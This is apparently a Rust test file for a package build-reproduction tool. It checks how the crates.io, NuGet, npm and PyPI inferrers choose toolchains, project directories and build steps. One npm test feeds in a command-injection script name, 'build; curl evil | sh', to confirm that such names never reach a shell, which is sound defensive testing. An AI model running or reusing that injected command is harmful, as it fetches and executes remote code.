//! The heuristic rungs' decisions that `infer.rs` does not reach, without a network.
//!
//! `infer.rs` holds the npm and PyPI rungs as they read registry metadata. The rest had no test:
//! the Cargo rung decides which toolchain builds a crate from nothing but an edition floor and a
//! date, and whether the index can be pinned at all; the NuGet and PyPI rungs decide which
//! directory of a repository is the package, from the repository itself; and the npm rung decides,
//! from the repository, whether a build nothing runs has to be run. Each of those is a
//! verdict-shaping choice, and each is stated in `heuristic.rs` as something the rung says out loud
//! when it guesses.
//!
//! A commit is always supplied or unreachable-by-design (a non-GitHub repository with none), so
//! no rung here resolves a tag over the network. Repositories that have to be read are made on the
//! spot with `git`.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Arc;

use trigon_core::{
    ArtifactId, Claim, Confidence, Ecosystem, Evidence, Intrinsics, SourceDiscovery,
    SourceProvenance, TargetRef,
};
use trigon_registry::{
    ArtifactMeta, Candidate, CratesIoInferrer, Derivation, NpmInferrer, NuGetInferrer,
    ResolvedTarget, SourceCache, StrategyInferrer,
};
use trigon_strategy::{FlowStrategy, StepBody, Strategy};

const COMMIT: &str = "ff8e7ba8b4122829cf66125ca8445cac7f073bce";

fn target(ecosystem: Ecosystem, name: &str, publish_time: Option<&str>) -> ResolvedTarget {
    ResolvedTarget {
        reference: TargetRef::new(ecosystem, name, "1.0.0"),
        artifacts: vec![ArtifactMeta {
            id: ArtifactId::new(format!("{name}-1.0.0.crate")),
            url: String::new(),
            declared: Vec::new(),
            declared_note: None,
            size: None,
        }],
        intrinsics: Intrinsics {
            publish_time: publish_time.map(str::to_string),
            declared_repo: Some("https://github.com/o/widget".into()),
            registry_moment: None,
            evidence: Vec::new(),
        },
        source: Some(SourceProvenance {
            repo_url: "https://github.com/o/widget".into(),
            declared_url: None,
            commit: COMMIT.into(),
            ref_name: None,
            subdir: None,
            how: SourceDiscovery::PublishedProvenance,
        }),
        about: None,
    }
}

/// A crate whose resolver recorded `edition` as it does: a Cargo floor with no ceiling.
fn a_crate(edition_floor: Option<&str>, publish_time: Option<&str>) -> ResolvedTarget {
    let mut t = target(Ecosystem::CratesIo, "widget", publish_time);
    if let Some(lo) = edition_floor {
        t.intrinsics.evidence.push(Evidence::new(
            Claim::ToolchainRange {
                tool: "cargo".into(),
                lo: Some(lo.into()),
                hi: None,
            },
            Confidence::Certain,
            "cargo:edition",
        ));
    }
    t
}

fn flow(c: &Candidate) -> &FlowStrategy {
    let Strategy::Flow(f) = &c.strategy else {
        panic!("expected a flow, got {:?}", c.strategy)
    };
    f
}

/// Every tool step of a phase, with its parameters — all of them literals, since everything the
/// heuristic hands a tool was read from outside the strategy, and none a template the package's
/// text could steer.
fn tools(steps: &[trigon_strategy::Step]) -> Vec<(String, BTreeMap<String, String>)> {
    steps
        .iter()
        .map(|s| match &s.body {
            StepBody::Uses { tool, with } => {
                assert!(with.is_empty(), "`{tool}` is given a template: {with:?}");
                (tool.clone(), s.literal.clone())
            }
            other => panic!("expected a tool step, got {other:?}"),
        })
        .collect()
}

fn says(c: &Candidate, words: &str) -> bool {
    c.assumptions.iter().any(|a| a.contains(words))
}

async fn one(rung: &dyn StrategyInferrer, t: &ResolvedTarget) -> Candidate {
    let mut got = rung.infer(t).await.expect("the rung does not fail");
    assert_eq!(got.len(), 1, "one candidate");
    got.remove(0)
}

// ---------------------------------------------------------------------------------------------
// crates.io
// ---------------------------------------------------------------------------------------------

#[tokio::test]
async fn a_crate_builds_with_the_cargo_current_at_its_publish_not_its_editions_floor() {
    // `edition = "2021"` puts Cargo at 1.56 or newer. A crate published in March 2024 built with
    // 1.56 is wrong by twenty releases; the six-week train says 1.76, which was current then.
    let t = a_crate(Some("1.56.0"), Some("2024-03-01T00:00:00Z"));
    let c = one(&CratesIoInferrer::new(), &t).await;
    let f = flow(&c);
    let deps = tools(&f.deps);
    assert_eq!(deps[0].0, "cargo/install-rust");
    assert_eq!(deps[0].1["rust_version"], "1.76.0");
    assert!(
        says(&c, "puts Cargo at 1.56.0 or newer"),
        "{:?}",
        c.assumptions
    );
    assert!(says(&c, "1.76.0"), "{:?}", c.assumptions);

    // The rest of the recipe: the crate is selected by name out of whatever workspace it is in,
    // and the output is where `cargo package` writes it.
    assert_eq!(f.location.repo, "https://github.com/o/widget");
    assert_eq!(f.location.git_ref, COMMIT);
    let build = tools(&f.build);
    assert_eq!(build[0].0, "cargo/build/package");
    assert_eq!(build[0].1["package"], "widget");
    assert!(!build[0].1.contains_key("toolchain_base"), "no mirror");
    assert_eq!(f.output_dir.as_deref(), Some("target/package"));
    assert_eq!(c.derivation, Derivation::Heuristic);
    assert_eq!(c.discovery, SourceDiscovery::PublishedProvenance);
    // A toolchain computed from a date is a guess with a reason, however exact the commit.
    assert_eq!(c.confidence, Confidence::Weak);
    assert!(
        says(&c, "fetched from static.rust-lang.org directly"),
        "{:?}",
        c.assumptions
    );
}

#[tokio::test]
async fn with_no_publish_time_the_floor_is_used_and_called_a_floor() {
    let t = a_crate(Some("1.56.0"), None);
    let c = one(&CratesIoInferrer::new(), &t).await;
    assert_eq!(tools(&flow(&c).deps)[0].1["rust_version"], "1.56.0");
    assert!(says(&c, "the *oldest* Cargo"), "{:?}", c.assumptions);
}

#[tokio::test]
async fn an_exact_cargo_version_is_used_as_it_stands() {
    // Something above this rung pinned the toolchain outright. That is not a floor to estimate
    // from, and no assumption about a train is added to it.
    let mut t = a_crate(None, Some("2024-03-01T00:00:00Z"));
    t.intrinsics.evidence.push(Evidence::new(
        Claim::ToolchainExact {
            tool: "cargo".into(),
            version: "1.80.1".into(),
        },
        Confidence::Strong,
        "ci:.github/workflows/release.yml",
    ));
    let c = one(&CratesIoInferrer::new(), &t).await;
    assert_eq!(tools(&flow(&c).deps)[0].1["rust_version"], "1.80.1");
    assert!(!says(&c, "six-week train"), "{:?}", c.assumptions);
}

#[tokio::test]
async fn a_crate_with_no_edition_declines_and_says_why() {
    // Any version this rung picked with no floor at all would be a guess, and a guess wearing a
    // recipe is a divergence nobody can trace.
    let t = a_crate(None, Some("2024-03-01T00:00:00Z"));
    let rung = CratesIoInferrer::new();
    assert!(rung.infer(&t).await.unwrap().is_empty());
    let why = rung.why_not(&t).await.expect("a decline with a reason");
    assert!(why.contains("declared no edition"), "{why}");

    // With an edition there is nothing to decline over, so there is nothing to say.
    assert_eq!(rung.why_not(&a_crate(Some("1.56.0"), None)).await, None);
}

#[tokio::test]
async fn behind_a_mirror_a_modern_cargo_resolves_against_the_index_at_the_publish_instant() {
    let t = a_crate(Some("1.56.0"), Some("2024-03-01T00:00:00Z"));
    let rung = CratesIoInferrer::new().with_mirror(Some("mirror:8080".into()));
    let c = one(&rung, &t).await;
    let f = flow(&c);
    let deps = tools(&f.deps);
    assert_eq!(
        deps.iter().map(|(t, _)| t.as_str()).collect::<Vec<_>>(),
        ["cargo/install-rust", "cargo/setup-registry"]
    );
    assert_eq!(
        deps[0].1["toolchain_base"], "http://mirror:8080/-toolchain/static.rust-lang.org",
        "the host is part of the mirror's toolchain path"
    );
    assert_eq!(deps[1].1["registry_time"], "2024-03-01T00:00:00Z");
    assert_eq!(deps[1].1["index_base"], "http://mirror:8080/-cargo");
    // The build phase needs the toolchain base too: `rust-toolchain.toml` installs on demand.
    assert_eq!(
        tools(&f.build)[0].1["toolchain_base"],
        "http://mirror:8080/-toolchain/static.rust-lang.org"
    );
    // crates.io never timestamps a yank, so every pinned resolve says so.
    assert!(says(&c, "except for yank state"), "{:?}", c.assumptions);
    assert!(!says(&c, "static.rust-lang.org directly"));
}

#[tokio::test]
async fn behind_a_mirror_a_cargo_older_than_sparse_is_not_pointed_at_it() {
    // Before 1.68 Cargo reads `sparse+http://host/` as a URL whose host is `sparse+http` and dies
    // in libgit2 with a DNS error. The mirror serves no git index, so the run says what it cannot
    // do instead of configuring something that fails obscurely.
    let t = a_crate(Some("1.31.0"), Some("2019-06-01T00:00:00Z"));
    let rung = CratesIoInferrer::new().with_mirror(Some("mirror:8080".into()));
    let c = one(&rung, &t).await;
    let deps = tools(&flow(&c).deps);
    assert_eq!(deps.len(), 1, "{deps:?}");
    assert_eq!(deps[0].1["rust_version"], "1.35.0");
    assert!(
        says(&c, "predates the sparse registry protocol"),
        "{:?}",
        c.assumptions
    );
}

#[tokio::test]
async fn behind_a_mirror_with_no_publish_time_the_index_is_left_unpinned_and_said_to_be() {
    // Pinning to *now* under a moment nobody chose resolves a dependency graph that never existed,
    // and does it silently.
    let t = a_crate(Some("1.56.0"), None);
    let rung = CratesIoInferrer::new().with_mirror(Some("mirror:8080".into()));
    let c = one(&rung, &t).await;
    assert_eq!(tools(&flow(&c).deps).len(), 1);
    assert!(says(&c, "the index is not pinned"), "{:?}", c.assumptions);
}

#[tokio::test]
async fn a_crate_with_nowhere_to_find_a_commit_declines_with_the_reason() {
    // No repository at all.
    let mut t = a_crate(Some("1.56.0"), None);
    t.source = None;
    let rung = CratesIoInferrer::new();
    assert!(rung.infer(&t).await.unwrap().is_empty());
    assert_eq!(
        rung.why_not(&t).await.as_deref(),
        Some("the registry declared no repository for this package")
    );

    // A repository with no recorded commit, on a forge the tag rung does not ask. Nothing is
    // fetched; the rung says what it looked for.
    let mut t = a_crate(Some("1.56.0"), None);
    let s = t.source.as_mut().unwrap();
    s.repo_url = "https://codeberg.org/o/widget".into();
    s.commit = String::new();
    assert!(rung.infer(&t).await.unwrap().is_empty());
    let why = rung.why_not(&t).await.unwrap();
    assert!(why.contains("https://codeberg.org/o/widget"), "{why}");
    assert!(why.contains("no tag there matches version 1.0.0"), "{why}");
    assert!(
        !why.contains("gitHead"),
        "that is npm's reason, not crates.io's: {why}"
    );
}

// ---------------------------------------------------------------------------------------------
// NuGet
// ---------------------------------------------------------------------------------------------

/// A directory of this test's own, removed when the test is done with it.
fn tmpdir(name: &str) -> tempfile::TempDir {
    tempfile::Builder::new()
        .prefix(&format!("trigon-heuristic-{name}-"))
        .tempdir()
        .unwrap()
}

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git")
        .current_dir(dir)
        .args(args)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@example.invalid")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@example.invalid")
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

/// A repository holding these files at one commit: where it is, the commit, a cache beside it, and
/// the directory holding all three, which goes when it is dropped.
fn local_repo(
    name: &str,
    files: &[(&str, &str)],
) -> (PathBuf, String, Arc<SourceCache>, tempfile::TempDir) {
    let root = tmpdir(name);
    let repo = root.path().join("origin");
    for (path, body) in files {
        let p = repo.join(path);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, body).unwrap();
    }
    git(&repo, &["init", "--quiet", "-b", "main"]);
    git(&repo, &["add", "-A"]);
    git(&repo, &["commit", "--quiet", "-m", "release"]);
    let commit = git(&repo, &["rev-parse", "HEAD"]);
    let sources = Arc::new(SourceCache::new(root.path().join("cache")).trusting_local_paths());
    (repo, commit, sources, root)
}

/// Point a target's source at a local repository and its commit.
fn at(t: &mut ResolvedTarget, repo: &Path, commit: &str) {
    let s = t.source.as_mut().unwrap();
    s.repo_url = repo.to_string_lossy().into_owned();
    s.commit = commit.to_string();
}

/// A repository holding these files at one commit, the rung pointed at it, the target, and the
/// directory to keep for as long as the rung reads.
fn nuget_repo(
    name: &str,
    files: &[(&str, &str)],
) -> (NuGetInferrer, ResolvedTarget, tempfile::TempDir) {
    let (repo, commit, sources, root) = local_repo(name, files);
    let mut t = target(Ecosystem::NuGet, "Widget", Some("2024-03-01T00:00:00Z"));
    at(&mut t, &repo, &commit);
    (NuGetInferrer::new().with_sources(Some(sources)), t, root)
}

const CSPROJ: &str = "<Project Sdk=\"Microsoft.NET.Sdk\"></Project>\n";

#[tokio::test]
async fn the_project_that_declares_the_package_id_is_where_the_build_runs() {
    // `Humanizer.Core` is built from `src/Humanizer/Humanizer.csproj`: the file name does not say
    // which project publishes it, and the `<PackageId>` does.
    let (rung, t, _repo) = nuget_repo(
        "declared",
        &[
            ("README.md", "widget\n"),
            (
                "src/Widget.Core/Widget.Core.csproj",
                "<Project><PropertyGroup><PackageId>Widget</PackageId></PropertyGroup></Project>",
            ),
            ("src/Widget/Widget.csproj", CSPROJ),
            ("test/Widget.Tests/Widget.Tests.csproj", CSPROJ),
        ],
    );
    let c = one(&rung, &t).await;
    let f = flow(&c);
    assert_eq!(f.location.subdir.as_deref(), Some("src/Widget.Core"));
    assert!(
        says(&c, "declares `<PackageId>Widget</PackageId>`"),
        "{:?}",
        c.assumptions
    );
    // `dotnet pack -o` resolves against the checkout root however deep the project is, and the
    // glob keeps the symbols package out of the comparison.
    assert_eq!(f.output_dir.as_deref(), Some("trigon-pack"));
    assert_eq!(f.output_path.as_deref(), Some("trigon-pack/*.nupkg"));
    // The version the feed served, because a committed `.csproj` routinely carries a placeholder.
    assert_eq!(tools(&f.build)[0].1["version"], "1.0.0");
    assert!(
        says(&c, "NuGet publishes no compiler version"),
        "{:?}",
        c.assumptions
    );
}

#[tokio::test]
async fn with_no_declaration_the_project_named_for_the_package_is_used_and_called_a_convention() {
    let (rung, t, _repo) = nuget_repo(
        "named",
        &[
            ("Widget/Widget.csproj", CSPROJ),
            ("tools/Build/Build.csproj", CSPROJ),
        ],
    );
    let c = one(&rung, &t).await;
    assert_eq!(flow(&c).location.subdir.as_deref(), Some("Widget"));
    assert!(
        says(&c, "a convention rather than a declaration"),
        "{:?}",
        c.assumptions
    );
}

#[tokio::test]
async fn two_projects_claiming_the_package_leave_the_build_at_the_root() {
    // Picking one would be a guess wearing a heuristic's name. The root is what the rung built
    // before it looked, and the failure there names the problem.
    let declared =
        "<Project><PropertyGroup><PackageId>Widget</PackageId></PropertyGroup></Project>";
    let (rung, t, _repo) = nuget_repo(
        "ambiguous",
        &[
            ("src/A/A.csproj", declared),
            ("src/B/B.csproj", declared),
            ("src/Widget/Widget.csproj", CSPROJ),
            ("test/Widget/Widget.csproj", CSPROJ),
        ],
    );
    let c = one(&rung, &t).await;
    assert_eq!(flow(&c).location.subdir, None);
    assert!(!says(&c, "the build runs"), "{:?}", c.assumptions);
}

#[tokio::test]
async fn a_repository_that_cannot_be_read_leaves_the_recipe_rather_than_losing_the_target() {
    // A force-pushed commit or a vanished repository must not turn a target that resolves into
    // one with no strategy at all.
    let (rung, mut t, _repo) = nuget_repo("unreadable", &[("Widget/Widget.csproj", CSPROJ)]);
    t.source.as_mut().unwrap().commit = "0".repeat(40);
    let c = one(&rung, &t).await;
    assert_eq!(flow(&c).location.subdir, None);
    assert_eq!(flow(&c).location.git_ref, "0".repeat(40));
}

#[tokio::test]
async fn a_declared_subdirectory_is_believed_without_reading_the_repository() {
    let (rung, mut t, _repo) = nuget_repo("declared-subdir", &[("Widget/Widget.csproj", CSPROJ)]);
    t.source.as_mut().unwrap().subdir = Some("src/Declared".into());
    let c = one(&rung, &t).await;
    assert_eq!(flow(&c).location.subdir.as_deref(), Some("src/Declared"));
}

#[tokio::test]
async fn the_nuget_feed_is_pinned_through_the_mirror_only_when_there_is_a_moment_to_pin_to() {
    let t = target(Ecosystem::NuGet, "Widget", Some("2024-03-01T00:00:00Z"));
    let pinned = one(
        &NuGetInferrer::new().with_mirror(Some("mirror:8080".into())),
        &t,
    )
    .await;
    // The moment travels in the path: `dotnet restore` sends no userinfo with a `--source` URL.
    assert_eq!(
        tools(&flow(&pinned).deps)[0].1["source"],
        "http://mirror:8080/-nuget/2024-03-01T00:00:00Z/index.json"
    );

    // A mirror with no moment would serve an unfiltered feed under a name that claims filtering.
    let t = target(Ecosystem::NuGet, "Widget", None);
    let unpinned = one(
        &NuGetInferrer::new().with_mirror(Some("mirror:8080".into())),
        &t,
    )
    .await;
    assert!(tools(&flow(&unpinned).deps)[0].1.is_empty());
    assert!(
        says(&unpinned, "no moment to pin the index to"),
        "{:?}",
        unpinned.assumptions
    );

    // And with no mirror at all, the live feed is named as what it is.
    let live = one(&NuGetInferrer::new(), &t).await;
    assert!(tools(&flow(&live).deps)[0].1.is_empty());
    assert!(
        says(&live, "resolves against the live feed"),
        "{:?}",
        live.assumptions
    );
}

#[tokio::test]
async fn a_nuget_target_with_no_repository_declines_with_the_reason() {
    let mut t = target(Ecosystem::NuGet, "Widget", None);
    t.source = None;
    let rung = NuGetInferrer::new();
    assert!(rung.infer(&t).await.unwrap().is_empty());
    assert_eq!(
        rung.why_not(&t).await.as_deref(),
        Some("the registry declared no repository for this package")
    );
    // A rung that has a commit has nothing to decline over.
    assert_eq!(
        rung.why_not(&target(Ecosystem::NuGet, "Widget", None))
            .await,
        None
    );
}

// ---------------------------------------------------------------------------------------------
// npm, with the repository in hand
// ---------------------------------------------------------------------------------------------

/// An npm target whose registry document recorded the toolchain and a build `npm pack` will not
/// run, with its source at a local repository holding `files`.
fn npm_with_repo(
    name: &str,
    script: (&str, &str),
    files: &[(&str, &str)],
) -> (NpmInferrer, ResolvedTarget, tempfile::TempDir) {
    let (repo, commit, sources, root) = local_repo(name, files);
    let mut t = target(Ecosystem::Npm, "widget", Some("2024-03-01T00:00:00Z"));
    at(&mut t, &repo, &commit);
    t.source.as_mut().unwrap().how = SourceDiscovery::RegistryCommit;
    for (tool, version, source) in [
        ("node", "20.11.1", "npm:_nodeVersion"),
        ("npm", "10.2.4", "npm:_npmVersion"),
    ] {
        t.intrinsics.evidence.push(Evidence::new(
            Claim::ToolchainExact {
                tool: tool.into(),
                version: version.into(),
            },
            Confidence::Certain,
            source,
        ));
    }
    t.intrinsics.evidence.push(Evidence::new(
        Claim::UnrunScript {
            name: script.0.into(),
            command: script.1.into(),
        },
        Confidence::Certain,
        "npm:scripts",
    ));
    let client = trigon_registry::Client::new(trigon_registry::ClientConfig::default()).unwrap();
    let rung = NpmInferrer::new(client).with_sources(Some(sources));
    (rung, t, root)
}

const PROMISES_DIST: &str =
    "{\"name\": \"widget\", \"main\": \"dist/index.js\", \"scripts\": {\"build\": \"tsc -p .\"}}\n";

#[tokio::test]
async fn a_build_nothing_runs_is_run_when_the_repository_lacks_what_the_manifest_promises() {
    // The manifest names `dist/index.js`; the repository has only sources; `npm pack` runs no
    // script that would build it. The published tarball holds what a build wrote, so the recipe
    // runs the build first — and says that it assumed the publisher did the same.
    let (rung, t, _repo) = npm_with_repo(
        "npm-shortfall",
        ("build", "tsc -p ."),
        &[
            ("package.json", PROMISES_DIST),
            ("src/index.ts", "export {}\n"),
        ],
    );
    let c = one(&rung, &t).await;
    let build = tools(&flow(&c).build);
    assert_eq!(build[0].0, "npm/build/custom");
    assert_eq!(
        build[0].1["command"], "build",
        "the script's name, never its body"
    );
    assert_eq!(build[0].1["npm_version"], "10.2.4");
    assert!(
        says(
            &c,
            "promises 1 file the repository does not contain (dist/index.js)"
        ),
        "{:?}",
        c.assumptions
    );
    assert!(
        says(&c, "`tsc -p .` is the publisher's own build command"),
        "{:?}",
        c.assumptions
    );
    assert_eq!(
        c.confidence,
        Confidence::Certain,
        "the registry recorded the commit"
    );
}

#[tokio::test]
async fn every_missing_promise_is_counted_and_the_first_few_are_named() {
    let (rung, t, _repo) = npm_with_repo(
        "npm-shortfall-many",
        ("build", "tsc -p ."),
        &[(
            "package.json",
            "{\"main\": \"dist/index.js\", \"module\": \"dist/index.mjs\", \
             \"types\": \"dist/index.d.ts\"}\n",
        )],
    );
    let c = one(&rung, &t).await;
    assert!(
        says(
            &c,
            "promises 3 files the repository does not contain \
             (dist/index.d.ts, dist/index.js, dist/index.mjs)"
        ),
        "{:?}",
        c.assumptions
    );
    assert!(says(&c, "would build them"), "{:?}", c.assumptions);
}

#[tokio::test]
async fn a_repository_that_commits_its_build_output_keeps_the_plain_recipe() {
    // Running the build here would regenerate files the repository already holds correctly, under
    // whatever today's floating ranges resolve to: a divergence manufactured by the fix.
    let (rung, t, _repo) = npm_with_repo(
        "npm-committed",
        ("build", "tsc -p ."),
        &[
            ("package.json", PROMISES_DIST),
            ("src/index.ts", "export {}\n"),
            ("dist/index.js", "module.exports = {};\n"),
        ],
    );
    let c = one(&rung, &t).await;
    assert_eq!(tools(&flow(&c).build)[0].0, "npm/build/pack");
    assert!(!says(&c, "promises"), "{:?}", c.assumptions);
}

#[tokio::test]
async fn a_script_name_that_is_not_one_word_is_never_handed_to_the_build() {
    // The script's name reaches a shell. A publisher-controlled name that is not a bare program
    // name is not read further, and the recipe stays the plain one.
    let (rung, t, _repo) = npm_with_repo(
        "npm-unsafe-name",
        ("build; curl evil | sh", "tsc -p ."),
        &[("package.json", PROMISES_DIST)],
    );
    let c = one(&rung, &t).await;
    assert_eq!(tools(&flow(&c).build)[0].0, "npm/build/pack");
}

#[tokio::test]
async fn a_repository_that_cannot_be_read_leaves_the_npm_recipe_as_it_was() {
    // A force-pushed commit must not turn a build failure into no strategy at all.
    let (rung, mut t, _repo) = npm_with_repo(
        "npm-gone",
        ("build", "tsc -p ."),
        &[("package.json", PROMISES_DIST)],
    );
    t.source.as_mut().unwrap().commit = "0".repeat(40);
    let c = one(&rung, &t).await;
    assert_eq!(tools(&flow(&c).build)[0].0, "npm/build/pack");
    assert_eq!(flow(&c).location.git_ref, "0".repeat(40));
}

// ---------------------------------------------------------------------------------------------
// PyPI, with the repository in hand
// ---------------------------------------------------------------------------------------------

fn pypi_with_repo(
    name: &str,
    files: &[(&str, &str)],
) -> (
    trigon_registry::PyPiInferrer,
    ResolvedTarget,
    tempfile::TempDir,
) {
    let (repo, commit, sources, root) = local_repo(name, files);
    let mut t = target(Ecosystem::PyPI, "pytz", Some("2024-03-01T00:00:00Z"));
    at(&mut t, &repo, &commit);
    let rung = trigon_registry::PyPiInferrer::new().with_sources(Some(sources));
    (rung, t, root)
}

#[tokio::test]
async fn a_project_that_is_not_at_the_root_is_built_where_its_setup_py_is() {
    // `stub42/pytz` keeps `setup.py` under `src/`, and nothing in any metadata says so. Built at
    // the root it failed with "does not appear to be a Python project".
    let (rung, t, _repo) = pypi_with_repo(
        "pypi-src",
        &[
            ("README.md", "pytz\n"),
            ("src/setup.py", "from setuptools import setup\n"),
            ("src/pytz/__init__.py", ""),
        ],
    );
    let c = one(&rung, &t).await;
    let f = flow(&c);
    assert_eq!(f.location.subdir.as_deref(), Some("src"));
    assert_eq!(f.output_dir.as_deref(), Some("src/dist"));
    assert!(
        says(
            &c,
            "no Python project at its root; `src/` is the one directory"
        ),
        "{:?}",
        c.assumptions
    );
    // Never better than weak: a tag or a commit plus assumed build requirements is an opening
    // guess, not a description of how the artifact was built.
    assert_eq!(c.confidence, Confidence::Weak);
}

#[tokio::test]
async fn a_project_at_the_root_or_a_repository_that_cannot_be_read_builds_at_the_root() {
    let (rung, t, _repo) = pypi_with_repo(
        "pypi-root",
        &[
            ("pyproject.toml", "[project]\nname = \"pytz\"\n"),
            ("src/setup.py", ""),
        ],
    );
    let c = one(&rung, &t).await;
    assert_eq!(flow(&c).location.subdir, None);
    assert_eq!(flow(&c).output_dir.as_deref(), Some("dist"));

    let (rung, mut t, _repo) = pypi_with_repo("pypi-gone", &[("src/setup.py", "")]);
    t.source.as_mut().unwrap().commit = "0".repeat(40);
    let c = one(&rung, &t).await;
    assert_eq!(flow(&c).location.subdir, None);
}

#[tokio::test]
async fn the_pypi_recipe_builds_what_the_run_compares_and_never_the_artifact_itself() {
    // The sdist is what a package with only platform wheels is verified against, and the build
    // must not consume the version it is reproducing.
    let mut t = target(Ecosystem::PyPI, "packaging", Some("2024-03-01T00:00:00Z"));
    t.about = Some(ArtifactId::new("packaging-1.0.0.tar.gz"));
    let rung = trigon_registry::PyPiInferrer::new().with_mirror(Some("mirror:8080".into()));
    let c = one(&rung, &t).await;
    let f = flow(&c);
    assert_eq!(tools(&f.build)[0].1["kind"], "sdist");
    let deps = &tools(&f.deps)[0].1;
    assert_eq!(deps["exclude_self"], "packaging!=1.0.0");
    assert_eq!(deps["registry_time"], "2024-03-01T00:00:00Z");

    t.about = Some(ArtifactId::new("packaging-1.0.0-py3-none-any.whl"));
    let c = one(&rung, &t).await;
    assert_eq!(tools(&flow(&c).build)[0].1["kind"], "wheel");
}
